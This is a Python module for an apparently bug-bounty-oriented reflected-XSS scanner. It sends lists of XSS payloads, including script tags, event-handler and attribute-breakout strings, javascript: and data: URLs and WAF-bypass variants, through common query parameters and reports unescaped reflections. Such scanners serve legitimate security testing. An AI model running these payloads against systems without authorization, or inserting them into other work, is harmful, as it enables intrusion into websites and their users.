#!/usr/bin/env python3
"""
Module 8: XSS Scanner
7 Layer XSS detection | Waktu: 20-30 menit | Akurasi: 90%
Mendeteksi: Reflected XSS, Attribute XSS, JavaScript XSS, URL XSS, WAF Bypass

MODIFIED: Added external HTTPClient support for X-Bug-Bounty header
"""

import asyncio
import re
import time
import hashlib
import random
import html
import urllib.parse
from typing import List, Dict, Optional
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class XSSScanner:
    def __init__(self, target: str, threads: int = 50, timeout: int = 5, client: HTTPClient = None):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.client = client  # External client with X-Bug-Bounty header
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ XSS VULNERABLE PARAMETERS ============
        self.xss_params = [
            'q', 'search', 's', 'keyword', 
            'name', 'username', 'email',
            'comment', 'message', 'feedback', 'review', 'post', 'title',
            'url', 'link', 'redirect', 'return', 'next', 'goto', 'callback',
            'page', 'id', 'cat', 'category', 'product', 'item',
            'error', 'msg', 'status', 'alert', 'text', 'content'
        ]
        
        # ============ CONTEXT 1: HTML BODY ============
        self.html_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
        ]
        
        # ============ CONTEXT 2: HTML ATTRIBUTE ============
        self.attribute_payloads = [
            "\" onmouseover=alert(1) x=\"",
            "' onmouseover=alert(1) x='",
            "\" onclick=alert(1) x=\"",
        ]
        
        # ============ CONTEXT 3: JAVASCRIPT ============
        self.js_payloads = [
            "alert(1);",
            "eval('alert(1)');",
            "window.alert(1);",
            "setTimeout('alert(1)',1);",
        ]
        
        # ============ CONTEXT 4: URL ============
        self.url_payloads = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
        ]
        
        # ============ CONTEXT 5: WAF BYPASS ============
        self.waf_payloads = [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<img src=x onerror=\"alert(1)\">",
            "<script>alert`1`</script>",
            "%3Cscript%3Ealert(1)%3C/script%3E",
        ]
        
        # Unique marker untuk deteksi akurat
        self.unique_marker = f"XSS_{hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:8]}"
    
    async def _get_client(self):
        """Get HTTP client - use external if available, otherwise create new"""
        if self.client:
            return self.client
        else:
            return HTTPClient(self.target, timeout=self.timeout, retries=1)
    
    async def test_payload(self, endpoint: str, param: str, payload: str, context: str) -> Optional[Dict]:
        """Test single XSS payload"""
        client = await self._get_client()
        test_payload = payload.replace('XSS', self.unique_marker)
        url = f"{endpoint}?{param}={urllib.parse.quote(test_payload)}"
        
        if not hasattr(client, 'session') or client.session is None:
            async with client as ctx_client:
                response = await ctx_client.get(url)
                if response and response.status == 200:
                    body = await response.text()
                    if test_payload in body:
                        html_encoded = html.escape(test_payload)
                        if html_encoded not in body:
                            return {
                                "vulnerable": True,
                                "type": "REFLECTED_XSS",
                                "context": context,
                                "severity": "high",
                                "confidence": 90,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload[:60],
                                "response_snippet": body[:300]
                            }
        else:
            response = await client.get(url)
            if response and response.status == 200:
                body = await response.text()
                if test_payload in body:
                    html_encoded = html.escape(test_payload)
                    if html_encoded not in body:
                        return {
                            "vulnerable": True,
                            "type": "REFLECTED_XSS",
                            "context": context,
                            "severity": "high",
                            "confidence": 90,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload[:60],
                            "response_snippet": body[:300]
                        }
        
        return None
    
    async def scan_endpoint(self, endpoint: str, param: str) -> List[Dict]:
        """Scan endpoint dengan prioritas"""
        
        findings = []
        
        # Priority 1: HTML injection (paling umum)
        for payload in self.html_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_payload(endpoint, param, payload, "html")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🔴 XSS on {endpoint} via {param}: HTML - {payload[:40]}")
                return findings
            await asyncio.sleep(0.02)
        
        # Priority 2: Attribute injection
        for payload in self.attribute_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_payload(endpoint, param, payload, "attribute")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🔴 Attribute XSS on {endpoint} via {param}: {payload[:40]}")
                return findings
            await asyncio.sleep(0.02)
        
        # Priority 3: JavaScript injection
        for payload in self.js_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_payload(endpoint, param, payload, "javascript")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"⚡ JS XSS on {endpoint} via {param}: {payload[:40]}")
                return findings
            await asyncio.sleep(0.02)
        
        # Priority 4: URL injection
        for payload in self.url_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_payload(endpoint, param, payload, "url")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🔗 URL XSS on {endpoint} via {param}: {payload[:40]}")
                return findings
            await asyncio.sleep(0.02)
        
        # Priority 5: WAF bypass
        for payload in self.waf_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_payload(endpoint, param, payload, "waf")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.info(f"🛡️ WAF Bypass on {endpoint} via {param}: {payload[:40]}")
                return findings
            await asyncio.sleep(0.02)
        
        return findings
    
    async def scan(self, custom_endpoints: List[str] = None) -> Dict:
        """Full XSS scanner"""
        
        if custom_endpoints:
            endpoints = custom_endpoints
        else:
            endpoints = ["/", "/search", "/api/search", "/query", "/product", "/user", "/comment"]
        
        total_params = len(self.xss_params)
        total_payloads = 18
        total_combinations = len(endpoints) * total_params * total_payloads
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT XSS SCANNER - BALANCED MODE")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints: {len(endpoints)}")
        logger.info(f"📊 Parameters: {total_params}")
        logger.info(f"📈 Payloads: {total_payloads}")
        logger.info(f"📊 Total tests: {total_combinations:,}")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"⏱️  Estimated time: 20-30 minutes")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for endpoint in endpoints:
            logger.info(f"\n📡 Testing endpoint: {endpoint}")
            
            for param in self.xss_params:
                findings = await self.scan_endpoint(endpoint, param)
                self.findings.extend(findings)
                if findings:
                    logger.info(f"  ✅ Found XSS via: {param}")
                await asyncio.sleep(0.02)
            
            self.stats['endpoints_tested'] += 1
            elapsed_so_far = time.time() - start_time
            logger.info(f"  ✅ Done: {endpoint} - {len(self.findings)} findings | {elapsed_so_far/60:.1f}m elapsed")
        
        elapsed = time.time() - start_time
        
        high_findings = [f for f in self.findings if f.get('severity') == 'high']
        
        print(f"\n{'='*60}")
        print(f"📊 XSS SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f} seconds ({elapsed/60:.1f} minutes)")
        print(f"📡 Endpoints tested: {self.stats['endpoints_tested']}")
        print(f"📊 Payloads tested: {self.stats['payloads_tested']}")
        print(f"🎯 XSS Vulnerabilities: {len(self.findings)}")
        
        if high_findings:
            print(f"\n🔴 XSS VULNERABILITIES FOUND:")
            for f in high_findings:
                print(f"   ⚡ {f['parameter']} | {f['context']} | {f.get('payload', '')[:50]}")
                print(f"      Endpoint: {f['endpoint']}")
        else:
            print(f"\n✅ No XSS vulnerabilities detected")
        
        print(f"\n{'='*60}")
        
        rating = "🔴 XSS VULNERABILITIES FOUND!" if self.findings else "✅ SECURE - No XSS detected"
        print(f"📈 Result: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "xss_scanner",
            "mode": "balanced",
            "target": self.target,
            "scan_time_seconds": round(elapsed, 2),
            "scan_time_minutes": round(elapsed/60, 1),
            "endpoints_tested": self.stats['endpoints_tested'],
            "payloads_tested": self.stats['payloads_tested'],
            "vulnerabilities_found": len(self.findings),
            "findings": self.findings
        }


# ================================================================
# MAIN RUN FUNCTION - MODIFIED FOR EXTERNAL CLIENT
# ================================================================
async def run(target: str, custom_endpoints: List[str] = None, client: HTTPClient = None) -> Dict:
    """
    Run XSS scanner - DRYBT XSS SCANNER
    
    Args:
        target: Target URL
        custom_endpoints: Custom endpoints to test (optional)
        client: Optional external HTTPClient (for X-Bug-Bounty header)
    """
    scanner = XSSScanner(target, client=client)
    return await scanner.scan(custom_endpoints)